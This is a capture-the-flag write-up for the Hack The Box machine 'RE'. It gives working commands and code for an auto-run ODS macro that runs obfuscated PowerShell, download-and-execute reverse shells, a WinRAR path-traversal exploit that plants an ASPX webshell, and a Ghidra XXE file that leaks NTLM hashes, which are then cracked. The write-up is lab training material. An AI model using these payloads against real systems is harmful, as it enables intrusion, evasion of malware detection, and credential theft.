# RE

This is the write-up for the box RE that got retired at the 1st February 2020.
My IP address was 10.10.14.19 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.144    re.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/re.nmap 10.10.10.144
```

```markdown
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Visit reblog.htb
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Checking HTTP (Port 80)

The page shows the following text and forwards to that domain:
```markdown
More sites coming soon.

Current site located at http://reblog.htb.
```

This site can be accessed after putting it into the _/etc/hosts_ file and it is a custom blog page that contains articles about **Reverse Engineering** and **Malware**:

![Blog Page](https://kyuu-ji.github.io/htb-write-up/re/re_web-1.png)

Page _About_:
```markdown
About

This blog is where I’ll share updates for the RE Shop here. Keep updated on the types of attacks coming towards the enterprise, including what kind of malware we’re seeing, as well as new techniques and strategies to employ.
```

Email address in the footer:
```markdown
malware@re.htb
```

- Summary of _"Automation and Accounts on Analysis Box"_:
  - "If you are going to automate running malware, create additional low priv accounts on your Windows Host to do so. I have several users on my box, some of which are just there to automate things(...)"
  - Potential username: _coby_
- Summary of _"New RE Tool - Ghidra"_:
  - Download link for Reverse Engineering tool **Ghidra**
  - Potential username: _kenny_
- Summary of _"Ghidra Exploit!"_:
  - Link to [Vulnerability in Ghidra](https://twitter.com/hackerfantastic/status/1103087869063704576?lang=en) from March 2019
- Summary of _"Analyzing Document Macros with Yara"_:
  - Link to [blog post from 0xdf](https://0xdf.gitlab.io/2019/03/27/analyzing-document-macros-with-yara.html) about **YARA rules**
- Summary of _"DOSfuscation and Invoke-Obfuscation"_:
  - Link to [White Paper from FireEye](https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/dosfuscation-report.pdf) about _cmd.exe_ obfuscation and detection
  - Link to PowerShell command and script obfuscator [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
  - "We have basic rules to look for PowerShell and cmd in macros(...)"
- Summary of _"ods Phishing Attempts"_:
  - "The SOC has been seeing lots of phishing attempts with ods attachements lately(...)"
    - They got rules in place for documents generated by **Metasploit** and documents with PowerShell or cmd invocations
  - "If you see any interesting documents that might get past our yara rules, please drop them in the malware dropbox(...)"
    - They've got automated processing that will check if the rules already identifies it and if not run it, to collect log data and for further analysis

This is a a lot of information and the next step is to search for the **Malware Dropbox** and potentially infect them with **ODS macros**.

### Checking re.blog

After browsing to _re.htb_, it has the title _"Ghidra Dropbox Coming Soon!"_ and shows the following text:
```markdown
Please check back soon for re.htb updates.
```

In the HTML source code is a comment that seems to be a hint for something:
```markdown
<!--future capability
	<p> To upload Ghidra project:
	<ol>
	  <li> exe should be at project root.Directory stucture should look something like:
	      <code><pre>
|   vulnerserver.gpr
|   vulnserver.exe
\---vulnerserver.rep
    |   project.prp
    |   projectState
    |
    +---idata
    |   |   ~index.bak
    |   |   ~index.dat
    |   |
    |   \---00
    |       |   00000000.prp
    |       |
    |       \---~00000000.db
    |               db.2.gbf
    |               db.3.gbf
    |
    +---user
    |       ~index.dat
    |
    \---versioned
            ~index.bak
            ~index.dat
		  </pre></code>
	  </li>
	  <li>Add entire directory into zip archive.</li>
	  <li> Upload zip here:</li>
    </ol> -->
```

## Checking SMB (Port 445)

Enumerating SMB shares:
```markdown
smbmap -H 10.10.10.144 -u anonymous
```
```markdown
Disk              Permissions     Comment
----              -----------     -------
IPC$              READ ONLY       Remote IPC
malware_dropbox   READ ONLY
```

Even though **SMBmap** shows that it is a Read-Only share, it is possible to upload files onto the box:
```markdown
smbclient \\\\10.10.10.144\\malware_dropbox
```
```markdown
smb: \> put test
putting file test as \test (0.0 kb/s) (average 0.0 kb/s)
```

When looking in the directory with `dir`, it shows the file and after a few seconds again, it disappears, which means an automated process processed it.
So by uploading a malicious **ODS file**, it may be possible to get code execution.

## Creating an ODS File

An **ODS** file is an **OpenDocument Spreadsheet** file that is the equivalent to Excel spreadsheets but for OpenOffice and LibreOffice.
I will use **LibreOffice Calc** to create such a file:
```markdown
Tools --> Macros --> Organize Macros --> Basic --> Untitled 1 --> New --> _Give a name to macro_
```

Basic code in the macro to test if it will work by pinging own IP address:
```basic
Sub Main
	Shell("ping -n 1 10.10.14.19")
End Sub
```

Making it run on load:
```markdown
Tools --> Customize --> Events --> Open Document --> Macro --> Select created macro
```

Uploading it on the box via SMB while listening on incoming ICMP packets with `tcpdump`:
```markdown
tcpdump -i tun0 icmp
```
```markdown
smbclient \\\\10.10.10.144\\malware_dropbox

smb: \> put ping.ods
```

After a while the spreadsheet gets processed and sends a ping back which proofs command execution.
Lets also test to run this with PowerShell and obfuscation:
```markdown
echo "ping -n 1 10.10.14.19" | iconv -t utf-16le | base64 -w 0
```
```markdown
cABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADQALgAxADkACgA=
```

Basic code in macro:
```basic
Sub Main
  var1 = "cm"
  var2 = "d /c "
  var3 = "powers"
  var4 = "hell -en"
  var5 = "codedcommand cABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADQALgAxADkACgA="
  Shell(var1 + var2 + var3 + var4 + var5)
End Sub
```

This also works and we found a way to obfuscate the strings _cmd_ and _powershell_ to run those commands.

### Getting a Reverse Shell

Lets modify the code to get a reverse shell on the box:
```markdown
echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.19/shell.ps1')" | iconv -t utf-16le | base64 -w 0
```
```markdown
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAOQAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQAKAA==
```

This Base64-encoded code has to be put in the macro.
The file _shell.ps1_ will be the script **Invoke-PowerShellTcp.ps1** from the **Nishang scripts** with the following line at the bottom:
```markdown
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.19 -Port 9001
```

After uploading the new **ODS** file, it gets processed, executes _shell.ps1_ and the listener on my IP and port 9001 starts a reverse shell session as _luke_.

## Privilege Escalation

A recommended thing to do on a Windows client, is to get the users password hash to have it available for later usage:

Running **Responder** to listen for SMB connections:
```markdown
responder -I tun0
```

Connecting to our local client from the box:
```markdown
Get-Content \\10.10.14.19\test
```

**Responder** responds with the **Net-NTLMv2** hash of _luke_:
```markdown
[SMB] NTLMv2-SSP Client   : 10.10.10.144
[SMB] NTLMv2-SSP Username : RE\luke
[SMB] NTLMv2-SSP Hash     : luke::RE:2476eb179cfaf453:AB98DAAFB494357AADA7ADB34FCA8AA5:0101000000000000C0653150DE09D2011C4BF50F54534082000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000200000E96516183FE770E6C6A0E968A1AC441E7CA20708FDCD32C1A5E21E7DFE20E3B10A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003900000000000000000000000000
```

> NOTE: This is optional and may not give any results.

Cracking it with **Hashcat**:
```markdown
hashcat -m 5600 luke_ntlm.hash /usr/share/wordlists/rockyou.txt
```

To get an attack surface on the box, it is recommended to run any **Windows Enumeration Script**:
```markdown
wget -o winPEAS.bat http://10.10.14.19/winPEAS.bat

cmd /c winPEAS.bat
```

Observations:
- User accounts: _cam_, _coby_, _luke_
  - User _coby_ is in the _Administrators_ group
- Installed programs show **WinRAR** installed and in the home directory of _luke_ is the executable _C:\Users\Luke\Downloads\winrar-5-50-beta-1-x86.exe_


After enumerating the box more and looking at the source of the web application, it has two more directories in _C:\inetpub\wwwroot_ but they cannot be accessed. This is why it showed different results at the HTTP part:
- _/blog_
- _/ip_
- _/re_


As the hint _"(exe should be at project root.Directory stucture)"_ on _re.htb_ shows, there is a directory called _C:\proj_drop_, but it is not accessible.

In the directory _C:\Users\Luke\Documents_ are the following files and directories:
- malware_dropbox
  - Directory where we landed initially
- malware_process
  - Empty directory
- ods
  - Empty directory
- ods.yara
  - **YARA rules** file to block malicious uploads on SMB
- process_samples.ps1
- yara64.exe
  - **YARA executable**

The PowerShell script _process_samples.ps1_ does the automation of the processing of the uploaded files and also uses _C:\Program Files (x86)\WinRAR\Rar.exe_ at some point.

As many things point to **WinRAR**, it could be that this [vulnerability found by Check Point Research](https://research.checkpoint.com/2019/extracting-code-execution-from-winrar/) could be the way to go.

### Exploiting WinRAR Vulnerability

To exploit this vulnerability, there is [exploit code available on GitHub](https://github.com/manulqwerty/Evil-WinRAR-Gen).
The file to upload will be an **ASPX** shell from the [tennc webshells](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx):
```markdown
python3 evilWinRAR.py -o shell.rar -e cmd.aspx -g requirements.txt -p 'C:\inetpub\wwwroot\re\'
```

This creates the malicious _shell.rar_ file that has to be downloaded to the box:
```markdown
cd C:\Users\Luke\Documents\ods

wget -o shell.rar http://10.10.14.19/shell.rar
```

Now the webshell can be accessed by browsing to _re.htb/cmd.aspx_ and command execution works:

![Webshell whoami](https://kyuu-ji.github.io/htb-write-up/re/re_web-2.png)

We can execute the _shell.ps1_ from before to start a reverse shell as the _iss appool_ user:
```markdown
Program: c:\windows\system32\cmd.exe
Arguments: /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.19/shell.ps1')
```

After running the command, the listener on my IP and port 9001 starts a reverse shell as _iis apppool_.

### Privilege Escalation 2

The user _iis apppool_ has read and write access to the _C:\proj_drop_ directory, which is empty.
When creating a file, it will be deleted after some seconds, because it gets automatically processed.

The comment in the beginning says, that this directory is for uploading **Ghidra projects** and it shows how the structure of it should look like.
Lets test out this [XXE vulnerability in Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71), by creating an **XML** file in a Ghidra project to execute commands:
```markdown
./ghidraRun
```
```markdown
File --> New Project --> Non-Shared Project --> _Choose project directory and give a project name_ --> Finish
```

I called the project _re_ghidra_ and the project files were created and Ghidra can be closed.
In the directory _re_ghidra.rep_ is a file called _project.prp_ that has to be used for the **XXE vulnerability** that allows code execution:
```markdown
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE aaa [
<!ENTITY % dtd SYSTEM "\\10.10.14.19\test">
%dtd;
]>

<FILE_INFO>
    <BASIC_INFO>
        <STATE NAME="OWNER" TYPE="string" VALUE="root" />
    </BASIC_INFO>
</FILE_INFO>
```

Compressing the **Ghidra** project:
```markdown
zip -r ghidra_xxe.zip *
```

Running **Responder** to listen for SMB connections:
```markdown
responder -I tun0
```

Downloading the compressed **Ghidra** project on the box into _C:\proj_drop_:
```markdown
wget -o ghidra_xxe.zip http://10.10.14.19/ghidra_xxe.zip
```

The _.zip_ file gets downloaded and processed and **Responder** responds with the **Net-NTLMv2** hash of _coby_ and a cleartext password of _anonymous_:
```markdown
[SMB] NTLMv2-SSP Client   : 10.10.10.144
[SMB] NTLMv2-SSP Username : RE\coby
[SMB] NTLMv2-SSP Hash     : coby::RE:05b5984434812a49:1EC5894FCB51E0719C93DC643A6E3BA5:0101000000000000C0653150DE09D20118EC0A8648E9C44A000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000C08F8ED730788918FE529E51BCB316C5CEEB962057A32DEBBF43D836EE28BC6C0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003900000000000000000000000000
[FTP] Cleartext Client   : 10.10.10.144
[FTP] Cleartext Username : anonymous
[FTP] Cleartext Password : Java11.0.2@
```

Cracking the hash with **Hashcat**:
```markdown
hashcat -m 5600 coby_ntlm.hash /usr/share/wordlists/rockyou.txt
```

After a while the hash gets cracked and the password of _coby_ is:
> championship2005

Creating a secure token on PowerShell to authenticate with _coby_:
```powershell
$pass = ConvertTo-SecureString 'championship2005' -asplain -force

$cred = New-Object System.Management.Automation.PSCredential('.\coby', $pass)

Invoke-Command -Computer re -Credential $cred -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.19/shell.ps1') }
```

After invoking the command, the listener on my IP and port 9001 starts a reverse shell connection as _coby_.
As _coby_ is in the _Administrators_ group, the user can read the root flag and the box is done!
